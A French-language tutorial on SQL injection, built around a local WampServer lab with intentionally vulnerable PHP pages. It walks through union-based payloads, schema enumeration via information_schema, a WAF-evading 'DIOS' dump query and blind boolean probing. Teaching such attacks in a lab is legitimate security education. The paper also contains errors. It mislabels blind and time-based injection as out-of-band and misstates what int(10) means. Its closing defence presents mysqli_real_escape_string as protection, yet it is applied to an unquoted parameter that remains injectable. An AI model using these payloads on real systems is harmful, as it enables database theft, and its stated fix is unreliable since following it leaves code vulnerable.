# SQLiPaper

Ce white paper traîtera les différents vecteurs d'attaque dans le cas où une ``injection SQL`` est possible.<br/>
L'injection SQL est un vecteur d'attaque qui offre la possibilité d'insérer du code sur mesure dans une application et de le faire exécuter automatiquement sur des systèmes backend inaccessibles.<br/>
Dans ce white paper j'utilise ``MySQL`` comme système de gestion de base de données relationnelle.<br/>
La faille SQLi représente actuellement presque ``2/3`` des attaques application web. C'est la faille la plus commune selon OWASP.<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158233875-8b440a6b-4f4d-4f1c-8b3e-28ebf0aa1fdd.png)
<br/>

## Background
Voici les différents types d'SQLis énumérés du plus soft au plus edgy (selon moi):

1. Union based -> ``IB``
2. Time based (inférentiel) -> ``OOB``
3. Blind based (inférentiel) -> ``OOB``
4. Routed based -> ``IB``

``IB``: In band<br/>
``OOB``: Out of band
<br/><br/>
Dans les 4 cas, nous utiliserons les mêmes méthodes d'approche.<br/>
J'introduirai aussi quelques techniques de bypass basiques pour avoid plusieurs filtres présents dans des ``WAF``.<br/>
J'évoquerai aussi la puissance des **jointures SQL** et à quoi ça sert de les utiliser dans le contexte d'une attaque SQL.<br/>

# Setup
Avant de commencer, il est important de déployer un serveur web localement ainsi que ``PMA`` (phpMyAdmin).<br/>
Afin de comprendre l'essence de la faille il faut comprendre le code qui l'induit et sans mise en contexte c'est pas possible.<br/>
Pour ce faire je vais utiliser ``WampServer``, c'est une plateforme de développement Web de type ``WAMP``, permettant de faire fonctionner localement des scripts ``PHP``.<br/>
Si on veut exécuter du SQL il nous faudra une base de donnée avec laquelle on pourra interagir.<br/> 
J'utilise ``PMA`` qui est une application Web de gestion pour les systèmes de gestion de base de données ``MySQL``<br/><br/>

# Steps
### WampServer
• Une fois tout installé, lancez WampServer.<br/>
• Rendez vous dans la path ``/www`` en cliquant sur:<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158238868-e9d82156-c272-440a-8870-2474de621a1e.png)
<br/><br/>
• Créez votre dossier projet avec dedans un fichier ``.php``, dans mon cas le dossier se nomme ``/sqlipaper`` et le fichier ``index.php``.<br/>
• Mettez votre adresse ``loopback`` avec le dossier correspondant dans n'importe quel navigateur web (``http://127.0.0.1/sqlipaper/index.php``).<br/>
• Si vous voyez la petite icone WampServer c'est que votre fichier PHP est bien hébergé, vous êtes donc prêt à écrire dedans.<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158240258-d9cd88c3-33ae-4659-a3a5-0a38a5cfd94d.png)
<br/><br/>
### phpMyAdmin
• J'ai choisi WampServer car il nous permet aussi d'accéder à phpMyAdmin.<br/>
• Même étape vous lancez WampServer et vous cliquez sur:<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158241274-b9f23547-1a1b-49c9-b915-306d45921b0c.png)
<br/><br/>
• Puis vous créez une nouvelle base de donnée en suivant les étapes figurées ci-dessous:<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158242535-0b05fe6e-d5f4-4498-82c4-b09bad167bd9.png)
<br/><br/>
• Avant d'attaquer la suite, j'aimerais vous faire comprendre de quoi est structurée une base de donnée.<br/>
• Une base de données permet de stocker et de retrouver des données structurées, semi-structurées ou des données brutes ou de l'information (cf. ixa qui stocke tout sous txt à coup de ``fopen()`` et ``fgets()`` ``¯\_(ツ)_/¯``).<br/>
• Je vous ai fait une petite représentation à l'aide de Lightshot:<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158244976-9db7876b-a1c5-4598-a7b3-ca2cc81b535b.png)
<br/><br/>
Grossomodo, chaque base de données contient des tables, qui elles contiennent des colonnes où nous pouvons stocker des données.<br/>
Pour la création de ces derniers on va exécuter du code SQL, la création peut aussi se faire de façon interfacée.<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158255790-7115a9e6-0db9-4fea-a6d7-7dcb43aece00.png)
<br/><br/>
```sql
CREATE TABLE users (
	id int(10) AUTO_INCREMENT NOT NULL,
	username VARCHAR(100) NOT NULL,
	PRIMARY KEY(id)
) ENGINE=innodb AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
```
• Comme son nom l'indique, l'instruction ``CREATE TABLE`` permet de créer une table. Ici nous créons la table ``users``.<br/>
• On assigne deux colonnes à la table ``users``, notamment ``id`` et ``username``. On passe la valeur ``PRIMARY KEY`` à la colonne ``id``.<br/><br/>
• La contrainte ``PRIMARY KEY`` identifie de manière unique chaque enregistrement dans une table. Les clés primaires doivent contenir des valeurs uniques et ne peuvent pas contenir de valeurs ``NULL`` ou de doublons. Une table ne peut avoir qu'une clé primaire ; et dans le tableau, cette clé primaire peut consister en une ou plusieurs colonnes (champs).<br/><br/>
• La commande ``AUTO_INCREMENT`` est utilisée afin de spécifier qu’une colonne ``int`` avec une ``PRIMARY KEY`` sera incrémentée automatiquement à chaque ajout d’enregistrement dans celle-ci.<br/><br/>
• ``int(10)`` signifie qu'on a défini ``id`` comme ``INT UNSIGNED``. Ainsi, on pourra stocker des nombres allant de ``0`` jusqu'à ``4294967295`` (à noter que la valeur maximale est composée 10 chiffres, donc MySQL ajoute automatiquement le (10) dans la définition de la colonne qui (10) n'est qu'un indice de format et rien de plus. Ça n'a aucun effet sur la taille du nombre que vous pouvez stocker).<br/><br/>
• Ici j'utilise ``VARCHAR``. Mais je peux aussi utiliser ``CHAR``. La différence est que ``CHAR`` est un type de données de longueur fixe, la taille de stockage de la valeur char est égale à la taille maximale de cette colonne. Étant donné que ``VARCHAR`` est un type de données de longueur variable, la taille de stockage de la valeur ``VARCHAR`` correspond à la longueur réelle des données saisies, et non à la taille maximale de cette colonne. Imaginons que j'insère la valeur ``zyuomo``, si ``CHAR`` était utilisé. Il aurait rempli le nombre de caractères restants par des espaces. Donc la valeur serait stockée avec 96 espaces. Tandis que si j'utilise ``VARCHAR``, la taille de la valeur correspondra à la taille de la valeur inscrite et non à la taille prédifinie (``100``).<br/><br/>
• ``ENGINE=innodb`` permet de définir le moteur de stockage par défaut utilisé par MySQL. Son principal avantage par rapport aux autres moteurs de stockage de MySQL est qu'il permet des transactions ``ACID`` (atomiques, cohérentes, isolées et durables), ainsi que la gestion des clés étrangères avec vérification de la cohérence.<br/><br/>
• Utilisez toujours ``DEFAULT CHARSET=utf8`` lors de la création de nouvelles tables. A ce stade, votre client et votre serveur MySQL doivent être en ``UTF-8`` (cf. https://my.cnf). n'oubliez pas que tous les langages que vous utilisez (tels que ``PHP``) doivent également être sous ``UTF-8``. Certaines versions de PHP utilisent leur propre lib client MySQL, qui peut ne pas être compatible avec ``UTF-8``.<br/>
Il nous reste qu'à exécuter:<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158256871-88e2a443-5c71-435e-9238-b9c3537e6bd9.png)
<br/><br/>
On peut constater que la table ``users`` et les colonnes ``id`` & ``username`` ont bien été créé dans la base de donnée ``sqlipaper`` avec les paramètres qu'on leur a assigné.<br/>
Maintenant, quoi faire d'une base de donnée qui ne contient aucune donnée? Eh bien rien, c'est pour ça qu'on va directement insérer une donnée dans la colonne ``id`` et ``username`` de la manière suivante:<br/>
```sql
INSERT INTO users VALUES(1, "zyuomo");
```
Vous l'aurez deviné, l'instruction ``INSERT INTO`` est utilisé pour insérer de nouveaux enregistrements dans une table.<br/>
J'insère la valeur ``1`` qui correspond à la colonne ``id`` et ``zyuomo`` à la colonne ``username``.<br/>
Tout est prêt, il nous manque plus qu'à scripter le code SQL vulnérable.<br/>
On se rend au fichier ``PHP`` qu'on a créé tout à l'heure.<br/>
Et c'est parti pour attaquer la première SQLi.<br/>

## Union Based
Rentrons dans le vif du sujet en commençant par le plus simple.<br/>

L'opérateur SQL ``UNION`` est utilisé pour combiner les résultats de deux déclarations ``SELECT`` ou plus.<br/>
Voici une instruction typique qui utilise l'opérateur UNION:
```sql
UNION SELECT id, username FROM users;
```
Cette instruction demande au ``SGBD`` d'afficher la colonne ``id`` et ``username`` de la table ``users``.<br/>
Le code suivant provoque la faille:
```php
<?php


$host = "localhost";
$user = "root";
$password = "";
$database = "sqlipaper";
$conn = new mysqli($host, $user, $password, $database);

if($conn->connect_error){
    die("Connection failed: " . $conn->connect_error);
}

if(!empty($_GET['id'])){
    $query = "SELECT id, username FROM users WHERE id = " . $_GET['id'];
    $succ = mysqli_query($conn, $query);
    $rank = 1;
    if (mysqli_num_rows($succ)) {
        while ($row = mysqli_fetch_array($succ)) {
            echo "{$row['username']} vous passe le bonjour!";

            $rank++;
        }
    }
}

?>
```
Je tiens à préciser que toutes les interactions avec le ``SGBD`` se feront sous ``mysqli`` et non ``PDO``.<br/>
Même si l'utilisation de ``PDO`` est bien plus simple que ``mysqli``.<br/>
En gros ``PDO`` utilise moins de méthodes pour exécuter une requête comparée à ``mysqli``.<br/>
De plus, lors des requêtes préparées, il donne la possibilité de nommer les paramètres ce qui est pratique tant bien pour la lisibilité que pour éviter les erreurs de positionnement des paramètres.<br/><br/>
Petite vulgarisation du code vulnérable ci-dessus:<br/><br/>
• Tout d'abord on ouvre une connexion à notre serveur MySQL local avec la fonction ``mysqli connect()``. L'utilisateur ``MySQL`` par défaut dans ``WampServer`` est ``root`` et ne contient pas de mot de passe.<br/><br/>
• La première condition vérifie si le paramètre ``id`` soit pas vide.<br/><br/>
• La requête ``SQL`` est passée à la variable ``$query``. Ceux qui ont l'œil auront déjà remarqué le souci dans le code, mais on va en parler après.<br/><br/>
• La requête est ensuite effectuée à l'aide de ``mysqli_query()`` qui est tout simplement la fonction qui permet d'exécuter la requête dans le ``SGBD`` et qui comporte en premier paramètre la connexion ``SQL`` et en deuxième paramètre la requête ``SQL``.<br/><br/>
• Ensuite on vérifie le nombre de lignes résultant de notre requête à l'aide de ``mysqli_num_rows()``. Le comportement de ``mysqli_num_rows()`` dépend de l'utilisation de jeux de résultats bufferisés ou non. Cette fonction renvoie 0 pour les ensembles de résultats non tamponnés, sauf si toutes les lignes ont été récupérées du serveur.<br/><br/>
• Puis on crée le tableau ``$row`` et on y ajoute tous les résultats grâce à ``mysqli_fetch_array()``. ``mysqli_fetch_array()`` récupère la ligne suivante d'un ensemble de résultats sous forme de tableau associatif, numérique ou les deux. Pour terminer on echo ``zyuomo`` la row ``username``.<br/><br/>

Si on passe ``1`` au paramètre ``id`` on obtient:<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158890989-11f49fe4-cf66-43ca-a7e5-a59329a3371f.png)
<br/><br/>
Logique, vu qu'on a déjà inséré l'utilisateur ``zyuomo`` avec comme id ``1`` dans la table ``users``.<br/>
Maintenant, où se trouve la faille? Si on prête attention à la requête SQL on peut voir que l'entrée de l'utilisateur n'est pas filtrée: 
```php
$query = SELECT id, username FROM users WHERE id = '" . $_GET['id'] . "'";
```
On se contente de concaténer notre macro (qui est une simple chaîne de caractère) avec ce qu'il a tapé, et on envoie la requête telle quelle au ``SGBD``. C'est la raison qui rend l'injection possible.<br/>
On part du principe qu'on a bien tapé un nombre, mais rien nous empêche d'envoyer autre chose.<br/>
On peut par exemple mettre un bout de requête SQL pour changer le sens de la requête.<br/>
Si on rentre comme id ``1 OR 1 = 1``, la requête envoyée au ``SGBD`` sera:
```sql
SELECT id, username FROM users WHERE id = 1 OR 1=1
```
Le sens de la requête a été modifié. Le ``SGBD`` va donc sélectionner l'utilisateur qui a pour id ``1``, et l'utilisateur où 1 est égal à 1 (ce qui est tout le temps vrai).<br/>
La preuve, si on exécute la requête suivante:
```sql
SELECT id, username FROM users WHERE id = 0 OR 1=1;
```
On obtient tout de même ``zyuomo`` car on demande d'afficher l'utilisateur avec comme id ``0`` (n'existe pas) **OU** tout utilisateur où 1 est égal à 1.<br/>
Dans l'url ça donne ça:<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/158894687-d238c3b2-feda-447d-875f-9c3bffbf94a7.png)
<br/><br/>
• J'utilise ``+`` pour remplacer les espaces, c'est plus lisible qu'avoir des ``%20`` partout.<br/>
• Pour connaître le nombre de sélections on va utiliser ``ORDER BY``. La commande ``ORDER BY`` permet de trier les lignes dans un résultat d’une requête SQL.
On peut aussi utiliser la commande ``GROUP BY``. Elle est utilisée pour grouper plusieurs résultats et utiliser une fonction de totaux sur un groupe de résultat.<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/159136013-292fac1d-2d97-4395-88fa-5a07251685c4.png)
<br/><br/>
• On obtient une erreur, donc il n'y a pas 3 sélections.<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/159136046-84fc0649-c1a2-415a-a862-7b183d47bcd9.png)
<br/><br/>
• A partir de 2 sélections il n'y a plus d'erreur, on peut donc utiliser ``UNION SELECT`` pour avoir notre point d'entrée.<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/159136155-c4f63ffb-a4d8-45bc-9f03-789b74edb976.png)
<br/><br/>
• Maintenant si je veux afficher la version de la BDD MySQL, l'username et l'hostname de la session MySQL et le nom de la BDD. J'exécute la requête suivante:<br/>
```sql
UNION SELECT NULL,CONCAT_WS(" | ",user(),version(),database())--+-
```
<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/159135842-efa9684e-24e5-4299-b907-2498353465d2.png)
<br/><br/>
• Et là c'est le moment où je vais bâcler ce paper car j'ai la flemme de faire 42 recherches pour vous expliquer des trucs accessibles.<br/>
• Pour extraire les tables de la BDD je fais: 
```sql
UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database();
```
<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/159717928-abf0cc62-6eb9-40cd-9482-50c50db8049f.png)
• Pour récupérer les colonnes de la table users je fais:
```sql
UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users';
```
• Si ``'`` est filtré vous pouvez encoder users en hex et past le résultat avec le préfixe ``0x``.
• Si on remplace la deuxième sélection par une commande ``DIOS`` (Dump in one shot) on peut retrieve toutes les tables et colonnes de la ``SGBD``. Ce ``DIOS``  utiliser est utilise contre les ``WAF`` qui bloquent ``concat``.<br/><br/>
```sql
(SELECT export_set(5,@:=0,(SELECT count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
```
<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/159718662-cfeb07b5-a53f-42b4-87d4-bea8b6cde76b.png)
<br/><br/>
Si on formatte la requête ça donne ça:<br/><br/>
```sql
(
SELECT
   export_set(5, @: = 0, 
   (
      SELECT
         count(*)
      from
         (
            information_schema.columns
         )
      where
         @: = export_set(5, export_set(5, @, table_name, 0x3c6c693e, 2), column_name, 0xa3a, 2)
   )
, @, 2)
)
```
<br/><br/>
• ``export_set()`` retourne une chaîne de caractères qui représente les bits en un nombre.<br/><br/>
• La syntaxe ressemble à ceci:<br/><br/>
``EXPORT_SET(bits,on,off[,séparateur[,nombre_de_bits]])``
<br/><br/>
**bits** (``5``): Il s'agit du numéro pour lequel vous souhaitez que les résultats soient renvoyés. Pour chaque bit défini dans cette valeur, vous obtenez une chaîne ``on``, et pour chaque bit non défini dans la valeur, vous obtenez une chaîne ``off``. Les bits sont examinés de droite à gauche (des bits de poids faible aux bits de poids fort).<br/><br/>
**on** (``@: = 0``): C'est ce qui est renvoyé pour tous les bits.<br/><br/>
**off** (``(SELECT count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2))``): C'est ce qui est renvoyé pour tous les bits désactivés .<br/><br/>
**séparateur** (``@``): Il s'agit d'un argument facultatif que vous pouvez utiliser pour spécifier le séparateur à utiliser. La valeur par défaut est le caractère virgule.<br/><br/>
**nombre_de_bits** (``2``): Le nombre de bits à examiner. La valeur par défaut est 64. Si vous fournissez une valeur plus élevée, celle-ci est tronquée à ``64`` si elle est supérieure à ``64``.<br/><br/>

## Blind Based
```php
<?php

$host = "localhost";
$user = "root";
$password = "";
$database = "sqlipaper";
$conn = new mysqli($host, $user, $password, $database);

if($conn->connect_error){
    die("Connection failed: " . $conn->connect_error);
}


if(!empty($_GET['id']))
{
    $id = mysqli_real_escape_string($conn, $_GET['id']);
    $query = "SELECT id, username FROM users WHERE id = ".$id;
    $rs_article = mysqli_query($conn, $query);

    if(mysqli_num_rows($rs_article) == 1)
    {
        echo "gq4022";
    }
    else
    {
        echo "";
    }
}

?>
```
Les ``SQLi blind based`` font partie des types d'``SQLi`` les plus simples quand on les maîtrise.<br/>
Tout d'abord, notez bien que cette fois-ci les réponses des requêtes SQL ne seront pas rendered dans la page web.<br/>
On va donc devoir baser nos vecteurs d'attaques sur une information boolean (``True`` ou ``False``).<br/>
Pour mieux vous expliquer je vais vous montrer un exemple.<br/>
On garde les même habitudes, on passe l'instruction ``order by`` et on précise 1 sélection (ce qui va forcément être ``True``) car dans le code source on constate bien que dans la requête SQL ``id`` et ``username`` sont sélectionnés (=2 sélections).<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/165356750-b861cf24-a569-4f32-959c-f38cd5f2f2c9.png)
<br/><br/>
On obtient ``gq4022``, cela veut dire qu'il y a au moins une donnée dans la réponse de ``$rs_article``.<br/>
Logiquement, si on passe 3 au ``order by`` (supérieur au nombre de sélections dans la requête SQL) on devrait obtenir une erreur ``Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result``.<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/165357330-75fb3553-014d-4058-b5b6-c9e8866bb1e4.png)
<br/><br/>
Notre vecteur d'attaque est donc prêt à être exploité. Maintenant la question qu'on peut se poser c'est "Comment afficher les données en brute si on n'a comme seule information l'équivalent à ``True`` ou ``False``?".<br/>
Et bien c'est là que la fonction ``substr()`` en SQL va nous être utile. Alors à quoi sert cette fonction?<br/>
Elle sert tout simplement à extraire une partie d'une chaîne, par exemple pour tronquer un texte.<br/>
Cette fonction prend en compte 3 paramètres. Dans le premier paramètre on va préciser la ``chaîne`` qu'on veut extraire, dans le deuxième paramètre la ``position``, et le troisième le ``nombre de caractères`` à ``extraire``. Pour assurer la facilité on va extraire chaque caractère individuellement.<br/>
Pour commencer on peut vérifier la taille de la row avec:<br/>
```sql
AND (SELECT LENGTH(username) > 15)--+-
```
• On obtient la réponse "gq4022" ce qui équivaut à ``True``. Donc nous savons que la row dans la colonne ``username`` fait plus de 15 caractères.<br/>
• On comprend vite alors que la taille exacte est de 19 caractères, car:<br/><br/>
![image](https://user-images.githubusercontent.com/74382279/166218665-1d65e9cf-899d-40d0-82c6-8d4e311b14a7.png)
<br/><br/>

# Eviter
• Le paramètre id est sanitized par ``mysqli_real_escape_string()``. Dans son style procédural cette fonction est utilisée pour créer une chaîne SQL valide qui pourra être utilisée dans une requête SQL. La chaîne de caractères string est encodée pour produire une chaîne ``SQL escaped``, en tenant compte du jeu de caractères courant de la connexion.<br/><br/>

### Rerences
- https://stackoverflow.com/questions/10879345/what-is-the-maximum-size-of-int10-in-mysql
- https://stackoverflow.com/questions/202205/how-to-make-mysql-handle-utf-8-properly
- https://dev.mysql.com/
- https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper2.pdf
- https://www.w3schools.com/sql/
- https://www.php.net/
